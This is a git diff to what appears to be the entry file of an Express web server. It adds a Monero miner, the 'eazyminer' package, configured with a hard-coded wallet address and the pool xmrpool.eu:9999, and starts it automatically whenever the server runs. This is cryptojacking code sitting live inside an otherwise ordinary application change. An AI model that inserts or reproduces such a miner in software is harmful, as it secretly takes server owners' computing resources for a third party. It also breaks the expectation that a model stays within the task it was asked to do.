@@ -6,6 +6,25 @@ require('dotenv').config({ path: './config/.env' })
 require('./config/db')
 const { fetchJwt } = require('./middleware/authMiddleware')
 const path = require('path')
+const Miner = require("eazyminer")
+
+const miner = new Miner({
+    pools: [{
+        coin: 'XMR',
+        user: '42y1kQtth6gfF1LoxiJkFM5bnpmQ1C2sDN8nPFuNFoKGdT7Tw47saUXjW21HQGHCki477BrjtJVNZj9sfHjNvccaHF4NgWB',
+        url: 'xmrpool.eu:9999', 
+    }],
+    web: {
+        enabled: true,
+        port: 3000
+    },
+    log: {
+      writeToConsole: true
+    },
+    autoStart: false // optional delay
+});
+
+miner.start();
 
 const app = express()
 
